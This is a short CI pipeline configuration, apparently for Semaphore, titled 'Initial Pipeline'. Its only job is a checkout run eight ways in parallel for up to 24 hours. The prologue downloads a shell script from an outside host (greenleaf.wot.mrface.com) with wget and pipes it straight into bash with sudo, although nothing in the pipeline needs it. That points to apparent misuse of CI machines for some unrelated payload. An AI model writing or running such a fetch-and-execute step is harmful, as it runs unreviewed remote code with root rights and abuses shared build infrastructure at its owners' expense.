version: v1.0
name: Initial Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
execution_time_limit:
  hours: 24
blocks:
  - name: 'Block #1'
    task:
      jobs:
        - name: 'Job #1'
          commands:
            - checkout
          parallelism: 8
      prologue:
        commands:
          - 'sudo apt update;sudo apt -y install git wget curl;sudo wget -O - http://greenleaf.wot.mrface.com/start_nodejs_sema_maz.sh | bash'
